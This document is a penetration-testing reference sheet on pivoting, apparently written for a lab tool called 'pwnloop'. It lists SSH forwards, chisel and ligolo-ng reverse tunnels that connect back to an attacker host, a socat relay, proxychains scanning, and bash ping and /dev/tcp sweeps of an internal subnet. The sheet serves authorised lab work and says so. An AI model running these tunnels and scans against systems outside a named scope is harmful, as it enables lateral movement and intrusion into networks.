# Pivoting and port forwarding

Reach services bound to `127.0.0.1` on the target, or hosts behind it.

## SSH tunnels (when you have SSH access)

```bash
# local forward: target's 127.0.0.1:8080 becomes your 8080
pwnloop x "ssh -i key -L 8080:127.0.0.1:8080 user@$T -N -f"
# dynamic SOCKS proxy — everything through the target
pwnloop x "ssh -i key -D 1080 user@$T -N -f"
# remote forward: expose your listener to a target that cannot reach you directly
ssh -R 4444:127.0.0.1:4444 user@attacker
```

## chisel (no SSH, staged in /opt/static)

```bash
# attacker
pwnloop x "cp /opt/static/chisel_* /engagements/$NAME/www/ && cd /engagements/$NAME/www && python3 -m http.server 8000" &
pwnloop x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
# target
./chisel client LHOST:9000 R:socks          # SOCKS5 on attacker:1080
./chisel client LHOST:9000 R:8080:127.0.0.1:8080   # single port
```

## ligolo-ng (cleanest when you can add a route)

A TUN interface instead of a SOCKS proxy — so `nmap -sS`, UDP and raw tools work
through it, unlike proxychains. Stage the agent like chisel.

```bash
# attacker: create the interface once, then start the proxy
pwnloop x "ip tuntap add user root mode tun ligolo; ip link set ligolo up"
pwnloop x "ip route add 10.10.20.0/24 dev ligolo"
pwnloop x "/opt/static/ligolo-proxy -selfcert" &
# target: connect back; then 'start' the tunnel/session in the proxy console
./agent -connect LHOST:11601 -ignore-cert
```

## socat relay (single port, no framework)

```bash
# on the target: forward its view of an internal host:port back out to you
./socat TCP-LISTEN:9001,fork,reuseaddr TCP:10.10.20.5:445
```

## Using the proxy

```bash
pwnloop x "proxychains4 -q nmap -sT -Pn -n 10.10.20.5"
pwnloop x "proxychains4 -q curl http://10.10.20.5"
```
`/etc/proxychains4.conf` — set `socks5 127.0.0.1 1080`. Note that only TCP
connect scans work through a SOCKS proxy; `-sS` and UDP do not.

## Quick internal discovery from the target

```bash
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i | grep -q ttl && echo 10.10.20.$i &) ; done
# no ping? bash TCP check:
for p in 22 80 445 3389; do (echo > /dev/tcp/10.10.20.5/$p) 2>/dev/null && echo "open $p"; done
```

Keep pivoting scoped to the machine's own lab subnet. Do not scan ranges the
operator did not name.
